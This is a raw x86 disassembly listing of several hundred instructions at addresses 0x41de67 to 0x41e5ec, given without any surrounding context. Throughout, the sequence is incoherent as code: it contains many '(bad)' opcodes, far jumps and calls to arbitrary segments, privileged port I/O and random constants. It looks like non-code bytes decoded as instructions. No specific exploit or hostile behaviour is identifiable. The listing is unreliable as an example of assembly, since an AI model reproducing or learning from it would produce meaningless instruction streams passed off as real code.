  41de67:	arpl   WORD PTR [esi],dx
  41de69:	jmp    0x23d1:0x9bc761e9
  41de70:	cmc    
  41de71:	test   eax,0x96424b4a
  41de76:	or     al,0xa7
  41de78:	lods   al,BYTE PTR ds:[esi]
  41de79:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41de7a:	inc    eax
  41de7b:	cwde   
  41de7c:	ins    DWORD PTR es:[edi],dx
  41de7d:	imul   edi,DWORD PTR [ebx],0xffffffed
  41de80:	imul   ecx,edx,0xffffffe3
  41de83:	clc    
  41de84:	inc    ecx
  41de85:	fcmove st,st(0)
  41de87:	ins    BYTE PTR es:[edi],dx
  41de88:	fisttp QWORD PTR [edi]
  41de8a:	mov    DWORD PTR [edi+ebx*1],ebx
  41de8d:	xor    eax,0x13a5f989
  41de92:	cmp    DWORD PTR [ebp+0x1b],ebp
  41de95:	jns    0x41debb
  41de97:	or     eax,0xba1f6ec0
  41de9c:	pushf  
  41de9d:	loope  0x41de2a
  41de9f:	std    
  41dea0:	push   esp
  41dea1:	push   ss
  41dea2:	lods   eax,DWORD PTR ds:[esi]
  41dea3:	add    DWORD PTR [ecx+0x2c],ebx
  41dea6:	(bad)  [ebx]
  41dea8:	(bad)  
  41dea9:	ins    BYTE PTR es:[edi],dx
  41deaa:	xor    eax,0x602249cb
  41deaf:	mov    ds,esi
  41deb1:	sahf   
  41deb2:	test   eax,0xdeccb7f2
  41deb7:	dec    edx
  41deb8:	mov    dh,0xb0
  41deba:	adc    DWORD PTR [ebx-0xe],esp
  41debd:	inc    esp
  41debe:	mov    ds:0xd2446e4b,eax
  41dec3:	adc    bl,bl
  41dec5:	aad    0x16
  41dec7:	inc    edi
  41dec8:	aas    
  41dec9:	jo     0x41de5d
  41decb:	sbb    al,0x7c
  41decd:	call   0x9180:0xee319a2
  41ded4:	xor    edi,DWORD PTR [ebp-0x31e73171]
  41deda:	xchg   edx,ebp
  41dedc:	xchg   esi,eax
  41dedd:	fcmove st,st(5)
  41dedf:	jb     0x41de6a
  41dee1:	fldenv [edi+0x1e966086]
  41dee7:	cmp    edi,DWORD PTR [ebx+0x54]
  41deea:	jnp    0x41deaa
  41deec:	dec    eax
  41deed:	jg     0x41df6b
  41deef:	or     edi,DWORD PTR [esi+ebp*8+0x2c]
  41def3:	adc    BYTE PTR [ebx],dh
  41def5:	scas   eax,DWORD PTR es:[edi]
  41def6:	call   0xcfe2f4f5
  41defb:	les    ecx,FWORD PTR gs:[ecx-0x2f21adc7]
  41df02:	je     0x41df2b
  41df04:	nop
  41df05:	jb     0x41df84
  41df07:	pop    es
  41df08:	call   0xe000:0xe3f2e213
  41df0f:	loope  0x41ded2
  41df11:	push   esi
  41df12:	dec    eax
  41df13:	xlat   BYTE PTR ds:[ebx]
  41df14:	outs   dx,DWORD PTR ds:[esi]
  41df15:	fwait
  41df16:	les    ebp,FWORD PTR [ecx]
  41df18:	pop    ss
  41df19:	(bad)  
  41df1a:	mov    cl,0x91
  41df1c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41df1d:	fsubr  QWORD PTR [ecx+0x4ddd365d]
  41df23:	bound  ecx,QWORD PTR [ecx*2+0x6904a66]
  41df2a:	rol    BYTE PTR ds:0x3cfb1b70,1
  41df30:	imul   ecx,DWORD PTR [eax+0x630b113],0x46
  41df37:	jbe    0x41df33
  41df39:	xchg   esp,eax
  41df3a:	push   0x5c
  41df3c:	sub    eax,0x1c1c65bf
  41df41:	aas    
  41df42:	or     eax,ebp
  41df44:	stc    
  41df45:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41df46:	adc    DWORD PTR [edx+0x6556920],edx
  41df4c:	repnz cmp al,0x4f
  41df4f:	pop    ds
  41df50:	pop    esi
  41df51:	fnstenv [edx+0x7c]
  41df54:	adc    BYTE PTR ds:0xb7fe49b7,cl
  41df5a:	sbb    al,0xc8
  41df5c:	das    
  41df5d:	test   al,cl
  41df5f:	xchg   edx,eax
  41df60:	sub    al,0x66
  41df62:	cli    
  41df63:	enter  0x31c5,0x90
  41df67:	mov    ecx,0xafbee855
  41df6c:	adc    DWORD PTR [edi+0x54],ebx
  41df6f:	push   edx
  41df70:	xor    ecx,ebp
  41df72:	add    al,0xd1
  41df74:	fbld   TBYTE PTR [ebx]
  41df76:	cld    
  41df77:	jmp    0x41dfa9
  41df79:	push   edx
  41df7a:	icebp  
  41df7b:	ins    DWORD PTR es:[edi],dx
  41df7c:	ds or  esi,edx
  41df7f:	test   al,0x32
  41df81:	push   ds
  41df82:	pop    ds
  41df83:	out    0x8,al
  41df85:	push   cs
  41df86:	les    esi,FWORD PTR [eax+0x59]
  41df89:	adc    DWORD PTR [ebx+esi*2+0x52],edi
  41df8d:	mov    ah,0xf7
  41df8f:	repz mov ah,0xa0
  41df92:	(bad)  
  41df93:	mov    edx,DWORD PTR [edx+0x7a7eb364]
  41df99:	cmc    
  41df9a:	fwait
  41df9b:	cmp    eax,0x3f7d8602
  41dfa0:	push   ebp
  41dfa1:	(bad)  
  41dfa2:	mov    eax,ds:0xfce0262f
  41dfa7:	add    al,0x4b
  41dfa9:	jmp    FWORD PTR [ebx+eiz*2]
  41dfac:	loope  0x41df51
  41dfae:	push   ebx
  41dfaf:	mov    edx,edx
  41dfb1:	xchg   edx,eax
  41dfb2:	jmp    0xf50a68ab
  41dfb7:	arpl   WORD PTR [edx-0x590901d5],di
  41dfbd:	scas   al,BYTE PTR es:[edi]
  41dfbe:	and    ebx,edi
  41dfc0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41dfc1:	cmp    edi,DWORD PTR [esp+0x52]
  41dfc5:	lock xor BYTE PTR [ebp+0x55085ccf],0xba
  41dfcd:	sub    eax,edx
  41dfcf:	mov    ds,WORD PTR [ecx]
  41dfd1:	pop    esp
  41dfd2:	mov    dl,0x77
  41dfd4:	in     al,0x2b
  41dfd6:	push   edx
  41dfd7:	rcl    DWORD PTR [edx],0x43
  41dfda:	push   edi
  41dfdb:	jmp    0x328c2f5a
  41dfe0:	add    ebx,ebp
  41dfe2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41dfe3:	xor    esi,DWORD PTR [edi-0x29ede0a5]
  41dfe9:	jecxz  0x41e068
  41dfeb:	sub    eax,0x1bad0c47
  41dff0:	mov    bl,0xf5
  41dff2:	rcl    DWORD PTR [eax],cl
  41dff4:	sub    eax,0xc1a3711d
  41dff9:	inc    ecx
  41dffa:	scas   eax,DWORD PTR es:[edi]
  41dffb:	mov    cl,0xd8
  41dffd:	pusha  
  41dffe:	fdiv   st,st(4)
  41e000:	test   eax,0x76345a89
  41e005:	cmp    dh,dh
  41e007:	inc    edx
  41e008:	loop   0x41e062
  41e00a:	data16 mov al,ds:0x8d18f493
  41e010:	jns    0x41e000
  41e012:	push   0x60c77628
  41e017:	out    0xe0,al
  41e019:	adc    cl,bl
  41e01b:	mov    DWORD PTR [ebx],eax
  41e01d:	jle    0x41dfa3
  41e01f:	bound  ebp,QWORD PTR [eax-0x6da1070e]
  41e025:	fiadd  WORD PTR [ebx+0x9]
  41e028:	dec    ebx
  41e029:	call   0xbaa9a05c
  41e02e:	mov    dh,ah
  41e030:	dec    edi
  41e031:	add    dh,BYTE PTR [esp+edi*8+0x41]
  41e035:	dec    edi
  41e036:	inc    edi
  41e037:	add    eax,0xabf8f6a3
  41e03c:	push   eax
  41e03d:	loop   0x41e040
  41e03f:	(bad)  
  41e040:	lods   eax,DWORD PTR ds:[esi]
  41e041:	mov    dh,0x5e
  41e043:	(bad)  
  41e044:	xor    DWORD PTR [edi],edx
  41e046:	dec    edx
  41e047:	xlat   BYTE PTR ds:[ebx]
  41e048:	lock dec esi
  41e04a:	mov    ecx,ebp
  41e04c:	jne    0x41e0b5
  41e04e:	mov    WORD PTR [eax+ebx*4],gs
  41e051:	cmp    al,0xaf
  41e053:	mov    al,0x49
  41e055:	mov    eax,ds:0x37ad1ea1
  41e05a:	sahf   
  41e05b:	mov    esp,?
  41e05d:	fst    DWORD PTR [ebx]
  41e05f:	push   edi
  41e060:	or     eax,0xd218692
  41e065:	cwde   
  41e066:	sbb    al,0xcb
  41e068:	shl    cl,0x7e
  41e06b:	mov    eax,0x84171e62
  41e070:	data16 int3 
  41e072:	dec    ebx
  41e073:	xchg   BYTE PTR [ebx+0x65560e8f],dl
  41e079:	jmp    0x41e0e6
  41e07b:	test   al,0xb
  41e07e:	lods   al,BYTE PTR ds:[esi]
  41e07f:	sbb    BYTE PTR [ebp-0x8],0x3f
  41e083:	test   al,0xe
  41e085:	pop    edx
  41e086:	rcl    DWORD PTR [ecx],1
  41e088:	mov    ebx,0x4dfd3699
  41e08d:	pop    ebp
  41e08e:	gs cli 
  41e090:	ins    BYTE PTR es:[edi],dx
  41e091:	pop    ss
  41e092:	test   BYTE PTR ds:0x5d58b132,ah
  41e098:	sub    ebp,eax
  41e09a:	out    dx,eax
  41e09b:	pop    ebx
  41e09c:	jmp    0x41e04a
  41e09e:	cmp    al,BYTE PTR [ebp+0x17]
  41e0a1:	and    ebp,esi
  41e0a3:	mov    BYTE PTR [ecx-0x3431c241],dl
  41e0a9:	aam    0x6c
  41e0ab:	mov    ds:0xee32640,al
  41e0b0:	cmp    DWORD PTR [ebp-0x450cae06],ecx
  41e0b6:	xchg   edx,eax
  41e0b7:	xchg   ecx,eax
  41e0b8:	adc    al,BYTE PTR [ebx+0x36a1d0cf]
  41e0be:	push   ss
  41e0bf:	daa    
  41e0c0:	imul   esp,DWORD PTR ds:[eax+eiz*2+0x540d88ae],0x73670ff1
  41e0cc:	aam    0x4e
  41e0ce:	mov    ds:0x68ef3670,al
  41e0d3:	xchg   esp,eax
  41e0d4:	adc    al,0xaa
  41e0d6:	int    0x43
  41e0d8:	fiadd  WORD PTR [ebx+ebp*8-0x54]
  41e0dc:	int3   
  41e0dd:	and    ecx,esi
  41e0df:	ficom  DWORD PTR [edi-0x39]
  41e0e2:	or     bl,BYTE PTR [ecx]
  41e0e4:	lock or esi,ecx
  41e0e7:	imul   ecx,ecx,0xb9039fbd
  41e0ed:	and    ebx,0x6ff58c0b
  41e0f3:	cmp    ebx,DWORD PTR [esi]
  41e0f5:	push   esp
  41e0f6:	adc    ebp,DWORD PTR [ebx-0x20]
  41e0f9:	(bad)  
  41e0fa:	mov    ecx,DWORD PTR [edi-0x5c6d9927]
  41e100:	and    DWORD PTR [ebx],edi
  41e102:	mov    esp,0x31f3e38f
  41e107:	dec    ecx
  41e108:	adc    BYTE PTR [eax+0x63c546a1],bh
  41e10e:	lahf   
  41e10f:	lods   eax,DWORD PTR ds:[esi]
  41e110:	mov    bh,0xdc
  41e112:	(bad)  
  41e113:	or     cl,bl
  41e115:	mov    esp,0x729873f8
  41e11a:	push   ebx
  41e11b:	out    0x6f,eax
  41e11d:	ficomp WORD PTR [ecx-0x20]
  41e120:	push   eax
  41e121:	inc    ebp
  41e122:	pop    edx
  41e123:	push   ds
  41e124:	add    DWORD PTR [ebx-0xf22b250],0x4c
  41e12b:	xchg   ebp,eax
  41e12c:	jnp    0x41e107
  41e12e:	sub    bl,BYTE PTR [eax+ecx*2]
  41e131:	js     0x196c4bfa
  41e137:	imul   ebp,DWORD PTR [ebx-0x474ea460],0xffffffbd
  41e13e:	call   0x4558df82
  41e143:	push   ds
  41e144:	aam    0x71
  41e146:	sub    al,BYTE PTR [ebx-0x3b]
  41e149:	pop    ebx
  41e14a:	sar    DWORD PTR [ecx-0x75],cl
  41e14d:	jno    0x41e119
  41e14f:	mov    edi,0xb03001a7
  41e154:	call   0x6200:0x57f8ee61
  41e15b:	(bad)  
  41e15c:	pusha  
  41e15d:	gs dec ebp
  41e15f:	jg     0x41e1ca
  41e161:	push   ecx
  41e162:	inc    ebp
  41e163:	fisttp QWORD PTR [esi+0x27]
  41e166:	cmp    eax,0xe33cda12
  41e16b:	fdivr  st(4),st
  41e16d:	pushf  
  41e16e:	sbb    BYTE PTR [eax-0x86ae9b7],0x29
  41e175:	stos   DWORD PTR es:[edi],eax
  41e176:	dec    edx
  41e177:	std    
  41e178:	cmp    al,0xd3
  41e17a:	sub    dl,BYTE PTR ds:0x8d4e3ca9
  41e180:	imul   edx,ebp,0x66edc7bd
  41e186:	push   0xed34d0df
  41e18b:	mov    ecx,0xfa7e07f6
  41e190:	jne    0x41e121
  41e192:	pop    ss
  41e193:	sbb    eax,0x14540c88
  41e198:	adc    bh,BYTE PTR [edi]
  41e19a:	test   DWORD PTR [ebx+edi*1-0x1d57cd92],edi
  41e1a1:	(bad)  
  41e1a2:	jb     0x41e135
  41e1a4:	inc    edx
  41e1a5:	loopne 0x41e19f
  41e1a7:	icebp  
  41e1a8:	pop    esi
  41e1a9:	or     bl,ah
  41e1ab:	mov    cl,0x22
  41e1ad:	fst    QWORD PTR [eax-0x43]
  41e1b0:	adc    eax,0xa36b5ec4
  41e1b5:	into   
  41e1b6:	sbb    BYTE PTR [edx],dl
  41e1b8:	sub    dh,BYTE PTR [edx-0x1c]
  41e1bb:	stos   DWORD PTR es:[edi],eax
  41e1bc:	in     eax,0x2e
  41e1be:	xor    DWORD PTR [ebx-0x56],eax
  41e1c1:	push   ss
  41e1c2:	cli    
  41e1c3:	(bad)  
  41e1c4:	or     eax,0xb7a3e17f
  41e1c9:	fs push ss
  41e1cb:	mov    dh,0xdf
  41e1cd:	nop
  41e1ce:	sub    dl,dl
  41e1d0:	pop    es
  41e1d1:	gs push cs
  41e1d3:	pusha  
  41e1d4:	and    esi,DWORD PTR [ebx-0x7b46e591]
  41e1da:	fcom   DWORD PTR [ebx-0x2277f98a]
  41e1e0:	pushf  
  41e1e1:	push   edx
  41e1e2:	pop    eax
  41e1e3:	push   ebp
  41e1e4:	sti    
  41e1e5:	imul   esp,DWORD PTR [ebx+0x4a],0xffffffcc
  41e1e9:	or     BYTE PTR [edx+0x68],ch
  41e1ec:	xor    al,0x35
  41e1ee:	in     eax,0xa0
  41e1f0:	fisttp WORD PTR [ecx+eax*4]
  41e1f3:	push   0x3cd70b2f
  41e1f8:	add    al,0xe2
  41e1fa:	push   ebx
  41e1fb:	hlt    
  41e1fc:	addr16 frstor [bx]
  41e200:	(bad)  
  41e202:	push   ecx
  41e203:	and    al,dh
  41e205:	(bad)  
  41e206:	or     cl,BYTE PTR cs:[edx]
  41e209:	int3   
  41e20a:	int    0xdc
  41e20c:	cmp    BYTE PTR [ebx],dh
  41e20e:	sahf   
  41e20f:	adc    eax,0xdf9d27fc
  41e214:	(bad)  
  41e215:	cmp    al,0x7
  41e217:	(bad)  
  41e218:	cli    
  41e219:	sbb    ch,BYTE PTR [eax]
  41e21b:	test   al,ch
  41e21d:	mov    al,ds:0x55afb405
  41e222:	rcr    ecx,0x43
  41e225:	loope  0x41e279
  41e227:	outs   dx,DWORD PTR ds:[esi]
  41e228:	or     al,0x6d
  41e22a:	push   ebx
  41e22b:	and    al,0x3a
  41e22d:	jmp    0xdb5ca29c
  41e232:	icebp  
  41e233:	and    BYTE PTR [edi+ecx*4-0x5bddf02f],ch
  41e23a:	cmp    eax,0x58ea87f4
  41e23f:	in     al,0x93
  41e241:	mov    ecx,DWORD PTR [ebx-0xcadec5d]
  41e247:	call   0xc6d7:0xdfeabb7f
  41e24e:	imul   edi,DWORD PTR [esi+ebx*8-0x16],0xc5fecd9a
  41e256:	div    DWORD PTR [ebx-0x6]
  41e259:	fnstcw WORD PTR [esi+0x1c]
  41e25c:	jb     0x41e2cf
  41e25e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e25f:	or     al,0xba
  41e261:	adc    eax,0x311ef066
  41e266:	mov    ebx,0x1865af58
  41e26b:	hlt    
  41e26c:	sub    eax,0x54e4ee93
  41e271:	clc    
  41e272:	pop    ss
  41e273:	and    eax,0xc3ec0cbc
  41e278:	test   DWORD PTR [esi-0x3a],esp
  41e27b:	cmp    ebp,DWORD PTR ds:0x67e14261
  41e281:	fistp  QWORD PTR [esi-0x5ad723ee]
  41e287:	inc    ax
  41e289:	xchg   ecx,eax
  41e28a:	pushf  
  41e28b:	lods   al,BYTE PTR ds:[esi]
  41e28c:	ret    0xd0e
  41e28f:	cmp    BYTE PTR [ecx],ch
  41e291:	pop    esp
  41e292:	js     0x41e29c
  41e294:	in     al,0xc2
  41e296:	or     BYTE PTR [edx-0x14],al
  41e299:	add    al,0xa6
  41e29b:	mov    esi,DWORD PTR [edi+esi*8+0x3f5010a1]
  41e2a2:	int3   
  41e2a3:	pop    esp
  41e2a4:	add    eax,0xef92011a
  41e2a9:	pop    ecx
  41e2aa:	lds    edi,FWORD PTR [ebx]
  41e2ac:	sub    ch,BYTE PTR [ebx]
  41e2ae:	jge    0x41e2ff
  41e2b0:	mov    bl,0xa9
  41e2b2:	cs jmp 0x41e2df
  41e2b5:	jne    0x41e325
  41e2b7:	ret    
  41e2b8:	stos   BYTE PTR es:[edi],al
  41e2b9:	in     eax,dx
  41e2ba:	test   eax,0xed9c1d9d
  41e2bf:	mov    dh,0xc6
  41e2c1:	arpl   WORD PTR [ebx-0x5b],sp
  41e2c4:	pushf  
  41e2c5:	xor    dl,BYTE PTR [esi]
  41e2c7:	clc    
  41e2c8:	loope  0x41e2e5
  41e2ca:	es mov dl,0x71
  41e2cd:	xor    eax,0xd9fed3b7
  41e2d2:	popa   
  41e2d3:	loopne 0x41e327
  41e2d5:	addr16 out 0xa8,al
  41e2d8:	call   0x7e50284c
  41e2dd:	retw   0x24c4
  41e2e1:	cmp    BYTE PTR [ebp+ecx*4+0x37],ah
  41e2e5:	mov    DWORD PTR [ebx],esp
  41e2e7:	mov    ds:0x713ef7aa,al
  41e2ec:	mov    edi,0xada34f1d
  41e2f1:	or     al,0x74
  41e2f3:	cdq    
  41e2f4:	cld    
  41e2f5:	or     ecx,DWORD PTR [edi+eax*1-0x333a76e5]
  41e2fc:	out    dx,eax
  41e2fd:	add    al,0x4
  41e2ff:	inc    ebx
  41e300:	int3   
  41e301:	and    eax,0xa6b66016
  41e306:	pop    edx
  41e307:	xor    ecx,0x2d578846
  41e30d:	fstp   DWORD PTR [ebx-0x66]
  41e310:	sub    eax,0x1c16ff43
  41e315:	dec    esp
  41e316:	jns    0x41e29a
  41e318:	xlat   BYTE PTR ds:[ebx]
  41e319:	mov    bl,0x65
  41e31b:	cmc    
  41e31c:	inc    esp
  41e31d:	mov    edx,0x2ff0403d
  41e322:	inc    eax
  41e323:	test   DWORD PTR [esi-0x1f6008e6],ecx
  41e329:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e32a:	int    0x56
  41e32c:	xchg   esi,eax
  41e32d:	lock fst DWORD PTR [edi-0x7f]
  41e331:	mov    ?,WORD PTR [edi-0x74505c83]
  41e337:	push   ss
  41e338:	jmp    0xab6e59ea
  41e33d:	clc    
  41e33e:	rcr    ah,1
  41e340:	lahf   
  41e341:	adc    esp,DWORD PTR [ebx+0x2d]
  41e344:	jno    0x41e361
  41e346:	mov    ebp,0x2f136633
  41e34b:	lds    eax,FWORD PTR [eax]
  41e34d:	std    
  41e34e:	add    eax,0x9d54e944
  41e353:	les    esp,FWORD PTR [edx+0xbd3a887]
  41e359:	es mov esi,0x57a6966c
  41e35f:	push   dx
  41e361:	ins    BYTE PTR es:[edi],dx
  41e362:	pop    ecx
  41e363:	or     dl,BYTE PTR [eax+0x7a]
  41e366:	popf   
  41e367:	aaa    
  41e368:	xchg   esi,eax
  41e369:	pop    ss
  41e36a:	loop   0x41e368
  41e36c:	fnsave [ebx+0x46]
  41e36f:	retf   
  41e370:	cld    
  41e371:	adc    bl,BYTE PTR [edx-0x17d1cc7e]
  41e377:	dec    edx
  41e378:	dec    ecx
  41e379:	dec    ebx
  41e37a:	(bad)  
  41e37b:	jo     0x41e33a
  41e37d:	in     eax,0x0
  41e37f:	and    esi,DWORD PTR [ebp-0x44]
  41e382:	pushf  
  41e383:	mov    dh,0x32
  41e385:	pop    eax
  41e386:	jno    0x41e3c1
  41e388:	ds call 0x7e4b:0xf3dafc6
  41e390:	pop    edi
  41e391:	ins    DWORD PTR es:[edi],dx
  41e392:	bound  esi,QWORD PTR [edi+eax*1-0x3b]
  41e396:	xor    eax,0x9af06b17
  41e39b:	(bad)  
  41e39c:	scas   al,BYTE PTR es:[edi]
  41e39d:	test   dh,ah
  41e39f:	into   
  41e3a0:	push   edx
  41e3a1:	pusha  
  41e3a2:	inc    edi
  41e3a3:	xor    DWORD PTR [eax-0x18],ebx
  41e3a6:	pop    eax
  41e3a7:	xchg   esi,eax
  41e3a8:	lock scas eax,DWORD PTR es:[edi]
  41e3aa:	loopne 0x41e338
  41e3ac:	jae    0x41e3f2
  41e3ae:	push   esi
  41e3af:	sbb    ecx,ebx
  41e3b1:	ins    BYTE PTR es:[edi],dx
  41e3b2:	dec    eax
  41e3b3:	jnp    0x41e34b
  41e3b5:	sbb    DWORD PTR [eax+0xbdf2865],ecx
  41e3bb:	cmp    bl,bh
  41e3bd:	mov    ebx,0xceba1967
  41e3c2:	or     ebp,0x1f
  41e3c5:	les    eax,FWORD PTR [ecx]
  41e3c7:	stos   DWORD PTR es:[edi],eax
  41e3c8:	jmp    0x41e3bf
  41e3ca:	pop    ecx
  41e3cb:	mov    ds:0x619971e4,al
  41e3d0:	pop    ebx
  41e3d1:	push   eax
  41e3d2:	xchg   ebx,eax
  41e3d3:	scas   al,BYTE PTR es:[edi]
  41e3d4:	mov    eax,fs
  41e3d6:	inc    edi
  41e3d7:	jecxz  0x41e364
  41e3d9:	pop    edi
  41e3da:	aas    
  41e3db:	sbb    dl,dl
  41e3dd:	dec    esp
  41e3de:	add    eax,esp
  41e3e0:	adc    dl,bl
  41e3e2:	shl    eax,1
  41e3e4:	sti    
  41e3e5:	sbb    BYTE PTR [edx-0x1],cl
  41e3e8:	sbb    al,0x94
  41e3ea:	fidivr DWORD PTR [edx-0x17]
  41e3ed:	jmp    0xeb1f5d9a
  41e3f2:	xchg   edi,eax
  41e3f3:	cmp    eax,0x55fefce3
  41e3f8:	bound  esp,QWORD PTR [ebx+0x71eb0634]
  41e3fe:	lods   al,BYTE PTR ds:[esi]
  41e3ff:	enter  0xeee9,0x9d
  41e403:	dec    edx
  41e404:	jle    0x41e452
  41e406:	jae    0x41e3ff
  41e408:	and    DWORD PTR [ecx-0x2a55d851],eax
  41e40e:	mov    ah,0xbc
  41e410:	shl    bl,cl
  41e412:	sbb    al,0x92
  41e414:	mov    cs,ebp
  41e416:	add    eax,0x1eb57b12
  41e41b:	mov    eax,ds:0x6043786b
  41e420:	jne    0x41e3b4
  41e422:	imul   BYTE PTR [ebx-0x44b4e2af]
  41e428:	push   eax
  41e429:	cmp    eax,0x4afac11b
  41e42e:	rcl    ah,1
  41e430:	cwde   
  41e431:	jns    0x41e3f1
  41e433:	mov    esi,0xf4d5425a
  41e438:	call   0xea40:0xef17807f
  41e43f:	and    DWORD PTR [ebp-0x2a],ebx
  41e442:	out    dx,al
  41e443:	pop    ebp
  41e444:	cmc    
  41e445:	or     eax,0xe6c0abc8
  41e44a:	mov    ah,0xb3
  41e44c:	sbb    bh,BYTE PTR es:[esi-0x41]
  41e450:	or     BYTE PTR [eax],dl
  41e452:	shr    DWORD PTR [ebp+0x5c],cl
  41e455:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e456:	cmp    ax,0x8fc5
  41e45a:	fisubr WORD PTR [ebp-0x71e20653]
  41e460:	jg     0x41e406
  41e462:	mov    dl,0xe3
  41e464:	pop    esp
  41e465:	pop    es
  41e466:	ret    0x5dae
  41e469:	and    ch,dh
  41e46b:	clc    
  41e46c:	push   es
  41e46d:	mov    al,0x74
  41e46f:	shl    BYTE PTR [edi-0x19520940],0xbd
  41e476:	add    esi,edx
  41e478:	and    ah,al
  41e47a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e47b:	push   0x33
  41e47d:	inc    ebp
  41e47e:	test   BYTE PTR [edi-0x3f282687],dh
  41e484:	sub    al,0xf7
  41e486:	popf   
  41e487:	pop    edi
  41e488:	in     eax,0x53
  41e48a:	push   esi
  41e48b:	cmp    eax,0x5ee2132d
  41e490:	cdq    
  41e491:	or     ch,BYTE PTR [ecx]
  41e493:	imul   BYTE PTR [esi-0x97405c2]
  41e499:	scas   al,BYTE PTR es:[edi]
  41e49a:	and    al,0xf7
  41e49c:	ja     0x41e47f
  41e49e:	sbb    BYTE PTR [edi-0x44],ch
  41e4a1:	stos   BYTE PTR es:[edi],al
  41e4a2:	gs (bad) 
  41e4a4:	(bad)  
  41e4a5:	call   0xb29c3fe3
  41e4aa:	(bad)  
  41e4ab:	aam    0x80
  41e4ad:	nop
  41e4ae:	les    edi,FWORD PTR [edi+0x48ad4f9d]
  41e4b4:	push   ss
  41e4b5:	popf   
  41e4b6:	lahf   
  41e4b7:	arpl   WORD PTR [ebx-0x4d],si
  41e4ba:	repnz inc esi
  41e4bc:	add    esp,DWORD PTR es:[ebx]
  41e4bf:	lods   eax,DWORD PTR ds:[esi]
  41e4c0:	mov    dl,0x88
  41e4c2:	sub    ah,BYTE PTR [eax-0x4182bff1]
  41e4c8:	pop    ds
  41e4c9:	sahf   
  41e4ca:	mov    DWORD PTR [eax+0x3e],ecx
  41e4cd:	push   ebx
  41e4ce:	push   ebp
  41e4cf:	mov    bl,0xf9
  41e4d1:	mov    ch,0xfb
  41e4d3:	inc    edx
  41e4d4:	and    BYTE PTR [esi+0x4],dh
  41e4d7:	out    0x80,al
  41e4d9:	repnz mov eax,ds:0x81f8dc8a
  41e4df:	(bad)  
  41e4e1:	jbe    0x41e484
  41e4e3:	mov    ebx,0xba5fffed
  41e4e8:	sbb    eax,0xee1ffeea
  41e4ed:	push   0x4aa98518
  41e4f2:	mov    al,0xa
  41e4f4:	or     ebp,esi
  41e4f6:	xor    esp,ebp
  41e4f8:	(bad)  
  41e4f9:	inc    edx
  41e4fa:	pop    edx
  41e4fb:	push   eax
  41e4fc:	ret    
  41e4fd:	mov    cl,0x12
  41e4ff:	or     eax,0xbf39a7c3
  41e504:	mov    al,ds:0xa7faa4a5
  41e509:	sbb    eax,0xe7a39f0c
  41e50e:	sbb    ebx,edi
  41e510:	push   es
  41e511:	and    cl,BYTE PTR [esi+0x73]
  41e514:	add    dh,bl
  41e516:	jbe    0x41e4bd
  41e518:	dec    esi
  41e519:	stos   DWORD PTR es:[edi],eax
  41e51a:	data16 jo 0x41e521
  41e51d:	sar    BYTE PTR [ebx],0xbe
  41e520:	mov    DWORD PTR [ebp-0x2acb1804],ebx
  41e526:	psrad  mm5,QWORD PTR [esi]
  41e529:	jbe    0x41e579
  41e52b:	out    dx,eax
  41e52c:	pop    es
  41e52d:	or     BYTE PTR [edi+0x457b554e],0x83
  41e534:	and    eax,0xe614947
  41e539:	cld    
  41e53a:	pop    ebx
  41e53b:	stos   BYTE PTR es:[edi],al
  41e53c:	popa   
  41e53d:	mov    ds:0xa2a39772,eax
  41e542:	sub    ah,ch
  41e544:	xor    al,0x59
  41e546:	push   esp
  41e547:	xor    eax,0x1c6c3dad
  41e54c:	clc    
  41e54d:	mov    ds:0x7e451942,eax
  41e552:	jo     0x41e5a7
  41e554:	out    dx,al
  41e555:	push   esp
  41e556:	scas   eax,DWORD PTR es:[edi]
  41e557:	mov    ebp,0x3159539e
  41e55c:	data16 in al,dx
  41e55e:	jecxz  0x41e51a
  41e560:	pop    ebx
  41e561:	push   ebp
  41e562:	cmp    edi,DWORD PTR [ebp+0x29202046]
  41e568:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e569:	loop   0x41e5c3
  41e56b:	into   
  41e56c:	retf   
  41e56d:	pop    ebp
  41e56e:	push   ss
  41e56f:	aaa    
  41e570:	pop    ss
  41e571:	retf   0xb84e
  41e574:	mov    ds:0x398b8ef3,al
  41e579:	pop    eax
  41e57a:	fistp  QWORD PTR [eax+ebp*4+0x60ffa1a6]
  41e581:	jecxz  0x41e576
  41e583:	cmp    al,0x40
  41e585:	jp     0x41e5cf
  41e587:	fstp   DWORD PTR [ecx]
  41e589:	out    0xee,al
  41e58b:	mov    fs,WORD PTR [edi]
  41e58d:	sar    DWORD PTR [eax+0x54],1
  41e590:	cmp    ecx,DWORD PTR [ecx-0x62a9de7e]
  41e596:	mov    ch,0x24
  41e598:	and    DWORD PTR [ebp-0x21ea86fd],edx
  41e59e:	mov    dh,0x2
  41e5a0:	lock push cs
  41e5a2:	xchg   DWORD PTR [esi-0x56235ebb],edi
  41e5a8:	pop    ebp
  41e5a9:	mov    ch,0xf4
  41e5ab:	stos   DWORD PTR es:[edi],eax
  41e5ac:	shr    BYTE PTR [edx+0x17],1
  41e5af:	dec    ebx
  41e5b0:	clc    
  41e5b1:	popa   
  41e5b2:	jecxz  0x41e53d
  41e5b4:	hlt    
  41e5b5:	sub    eax,ecx
  41e5b7:	sbb    DWORD PTR [eax],0x26
  41e5ba:	fist   DWORD PTR [edi-0x44]
  41e5bd:	push   0xffffff88
  41e5bf:	xchg   esi,eax
  41e5c0:	mov    cl,0x13
  41e5c2:	aas    
  41e5c3:	jp     0x41e57c
  41e5c5:	cmp    eax,0x38ca455a
  41e5ca:	fndisi(8087 only) 
  41e5cc:	xor    ecx,ecx
  41e5ce:	stos   DWORD PTR es:[edi],eax
  41e5cf:	mov    eax,0x6895eb0
  41e5d4:	pop    edi
  41e5d5:	repz sar DWORD PTR [esp+eax*2-0x73],cl
  41e5da:	cmp    eax,0x8b59d634
  41e5df:	xor    ah,BYTE PTR [edi-0x3dfd1c6e]
  41e5e5:	cli    
  41e5e6:	fldenv [edi+0x78]
  41e5e9:	into   
  41e5ea:	out    0x41,eax
  41e5ec:	sbb    bh,BYTE PTR [ebx+0x2c]
